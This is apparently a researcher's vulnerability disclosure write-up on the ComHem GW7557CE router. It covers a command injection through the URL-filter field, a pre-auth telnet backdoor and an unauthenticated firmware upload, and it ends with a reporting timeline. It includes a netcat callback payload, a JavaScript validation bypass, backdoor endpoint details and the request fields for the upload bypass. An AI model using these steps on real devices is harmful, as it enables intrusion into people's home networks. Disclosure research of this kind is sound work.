# ComHem GW7557CE Research
I had recently moved into a new apartment, and was on the lookout for a new project. Seeing as I had just been given a new router by my ISP, I figured it would make a good target. It is, after all, the entrypoint into my home network.

## Disclaimer
This research was conducted on private machines in my spare time. My views and actions are my own and may not reflect the views of my employer. This research was done without malicious intent, but a desire to understand and secure the devices in my home.

## TLDR
Conducted vulnerability research on ComHem GW7557CE 6.12.0.13e, found the following vulnerabilities;
* Post-auth command injection
* Pre-auth telnet backdoor
* Pre-auth firmware update

## Recon
I figured a good place to start would be to just look around the user interface and see what information I could gather.

![image](https://user-images.githubusercontent.com/25673723/184676697-4da7c068-7f50-44a9-9b33-10dfc1205411.png)

In the top right-hand corner there seems to be some version information. The device model is `GW7557CE`, and the firmware version is `6.12.0.13e`. Since it also says `Compalbn` I believe this is a reskinned Compal router.

Given this information, I went online looking for a firmware image for this specific device. Unfortunately I found no such image, which means I would have to stick to black-box testing until I could extract the firmware image from the device itself.

A quick port-scan through the commonly used TCP ports yielded few results, as seen below.

![image](https://user-images.githubusercontent.com/25673723/184677283-f23efead-efe7-4081-a8b5-1bb52be4c3dd.png)

I wanted a way to gain code execution on the device and obtain the firmware, and decided to start by looking at the web interface. I went looking for features that likely use shell commands in the back-end, since such functionality may allow an attacker to execute their own commands if implemented improperly. One such feature which frequently contains bugs is the ping feature, which is commonly found in routers.

After a thorough look around the different features I found three interesting candidates. Ping, traceroute and URL filtering.

### Getting shell
The ping and traceroute features seemed to reject any inputs containing anything but alphanumeric characters or periods, which is what you would expect to see in a domain or IP address.

The URL filtering feature has some front-end user input validation, which is trivially disabled by either modifying requests inside an intercepting proxy or by issuing the following code snippet in the JavaScript console.
```js
function is_valid_url(url) {
  return "OK";
}
```

Now we are able to use any string we want as a filter, and attempting to filter the URL `nc 192.168.0.42 4444` sends a TCP connection to my machine!

![image](https://user-images.githubusercontent.com/25673723/184678277-57633eac-4228-4ffd-9a34-94caa64f6bdf.png)

![image](https://user-images.githubusercontent.com/25673723/184678322-dc4a2dcf-28f7-4ee3-91c7-9811b6cf16c7.png)

By piping the output  of commands to netcat, we can start looking around the filesystem. The folder sbin  contains a binary called utelnetd. Running this binary opens a telnet shell.

![image](https://user-images.githubusercontent.com/25673723/184678347-c83dd32a-7c71-4ff9-8b9d-8396ba69c157.png)

## Hunting for More Bugs
With a shell and netcat present on the device it should be simple enough to download the root filesystem. A quick glance at the file `/proc/cmdline` reveals that the root filesystem is located at `/dev/mmcblk0p12`, which I downloaded with netcat.

At this point I can mount the filesystem on my local machine. I was not quite happy with a single post-auth command injection vulnerability, and wanted to find something a bit more severe. Considering the portscan from the previous segment, I figured the best way forward would be to keep looking for bugs in the web application, but aided by static analysis.

I knew from my curl commands that the server was lighttpd, a very common choice for embedded devices.

![image](https://user-images.githubusercontent.com/25673723/184678447-d55f6cf5-9309-4279-94ed-60ab5744205c.png)

I was unable to find the lighttpd binary on the root filesystem but found it on another partition, `/dev/mmcblk0p14`, which was mounted to the `/fss/gw` directory. This partition seems to contain the binaries for a lot of the user-facing features this router has.

So now I had the webserver binary and it’s configuration file, which was found on the same partition.

![image](https://user-images.githubusercontent.com/25673723/184678607-f1348ec4-d016-48da-81fd-bc78577e24e8.png)

The lighttpd codebase is quite mature and has been audited by a lot of people way smarter than me, so I always analyze the third-party code first. The lighttpd module `mod_cbn_web` looks like it could be interesting, and I will take a look at that next. However, it is important not to disregard the lighttpd binary completely since it could be modified!

The mod_cbn_web binary is located at `/lib/mod_cbn_web.so`. Cracking it open in Ghidra and navigating to the mod_cbn_web_plugin_init function reveals some function pointers.

![image](https://user-images.githubusercontent.com/25673723/184678762-0895d869-4090-4059-94c4-2eabe40d3924.png)

A quick glance through these functions and it’s clear that the function on index 8 is the primary handler function for my requests. This is where I should start looking for bugs.

![image](https://user-images.githubusercontent.com/25673723/184678803-5bc7315d-dd5e-4fd5-b06a-e8928b2fc41b.png)

### Pre-auth Backdoor
A bit further down in the same function I noticed something interesting. Before any sort of authentication logic I see the following code.

![image](https://user-images.githubusercontent.com/25673723/184679047-82870a97-230e-4e0d-a922-d04587dcc1b8.png)

If `UrlType` is set to either 4 or 5 and `ContentBuf` is not equal to zero, the function `cbnTelnentEnableAuth` is called. The function in question looks as follows.

![image](https://user-images.githubusercontent.com/25673723/184679310-3af9ee74-a423-4929-a885-f4b9089ea57c.png)

Ghidra won’t decode this variable as a string, but the integer assignments seen in this function are equal to `strcpy(local_24, “REDACTED”);`. That string is then compared to the contents of `ContentBuf`, and if the comparison checks out some command is written to a file, presumably starting a telnet shell. The `ContentBuf` variable is simply a pointer to POST-data sent by the user. So if a POST-request can be sent to a URL of type 4 or 5, this will likely open a telnet backdoor. A quick glance at the `cbn_http_get_RqUrlType` function reveals that the endpoints `getter.xml` and `setter.xml` have the types 4 and 5 respectively. Now all that is left is opening the backdoor, which is accomplished as seen in the image below.

![image](https://user-images.githubusercontent.com/25673723/184886542-95033a92-77ed-4d20-bae4-a42389ab030c.png)


The good old telnet backdoor, classic. The next question is, what is the login? Going back to the root filesystem and reading the shadow file reveals that the root account is not password protected, which makes things quite easy.

![image](https://user-images.githubusercontent.com/25673723/184679589-5ae9ba7f-3b6f-44da-be6b-f8af9f63112c.png)

### Insecure Firmware Update
With strengthened resolve thanks to the backdoor I figured I would look for more vulnerabilities. One of the first steps I usually take when attacking any IoT device is look for CGI binaries. In this case, I only found one. This binary is called `cbnUpload.cgi`. Running strings on the binary seems to indicate it is used for updating the firmware on the device.

![image](https://user-images.githubusercontent.com/25673723/184679730-8bebf74a-f674-4d8a-bc8a-7d05c444fce3.png)

Reversing the main function of the `cbnUpload.cgi` binary indicates that if the upload fails, the user should get see some error message. This, however, is not the case. No matter what I sent to the cgi-binary, I simply got an empty 200 OK response, as seen in the image below.

![image](https://user-images.githubusercontent.com/25673723/184679821-57158443-6bd2-45a2-8851-9975f77014a3.png)

I was unable to find an explanation for this behavior in the CGI binary, so I went back to the lighttpd module, `mod_cbn_web`. Looking through the module, it seems some form of access control has been implemented, as seen here.

![image](https://user-images.githubusercontent.com/25673723/184679863-b13a8b7a-b088-4579-85c3-af99b5f35fcf.png)

The `UrlType` is set to 3 whenever the path requested contains the string `cbnUpload.cgi`. We pass through the functions `CheckUserAuthority` and `cbn_HttpAccessControl` without issue thanks to exceptions setup for that specific `UrlType`, but the function `mod_cbn_fwupload_status` looks for an access token and returns 5 if the token is non-existent or invalid, which will interrupt execution.

On the bright side, this module is not actually responsible for executing the CGI binary. That is done by another module, likely `mod_cgi`. This means that if this module can be tricked to avoid interrupting the execution of the CGI binary, it may be possible to call the binary without the necessary token. I had the idea that this might be achievable if the `UrlType` variable can be set to something other than 3, while still having the path be `cbnUpload.cgi`.

With this in mind I revisited the `cbn_http_get_RqUrlType` function, and was pleasantly surprised.

![image](https://user-images.githubusercontent.com/25673723/184680137-cf7cb33e-26d6-4841-9f8f-7b7c5a94dd38.png)

Note that the first two string searches here check different strings than the last one. The offset 0x14c refers to the query string, while the offset 0x104 refers to the path. Let’s try to make a request with one of these strings in our query string.

![image](https://user-images.githubusercontent.com/25673723/184680184-47adb18b-dffb-4a2c-a36b-7c53174ad60a.png)

Bingo! It seems the URL types 1 and 2 enjoy the same authentication exemptions as type 3, but without needing any pesky tokens. Some quick reversing of the `cbnUpload.cgi` binary reveals that it expects a multipart request where the form name is set to `CBNFileUpload` and the filename attribute set to `CBN_FW_UPGRADE`, as seen in the following curl command.

![image](https://user-images.githubusercontent.com/25673723/184680326-8a626e67-b877-489e-9538-497facc125dc.png)

Note that this vulnerability likely is present on other Compal devices as well.

Now all that is left is to create a valid firmware image. However, this can be quite an arduous task and I felt that it was time to conclude this little side project.

## Timeline
* 28/01/22 13:10 – Reported to Tele2 via customer support phone line
* 16/05/22 21:00 – Sent report via email to Tele2 and Compal
* 04/07/22 14:29 – Received an automated email response
* 15/08/22 19:10 - Published this research
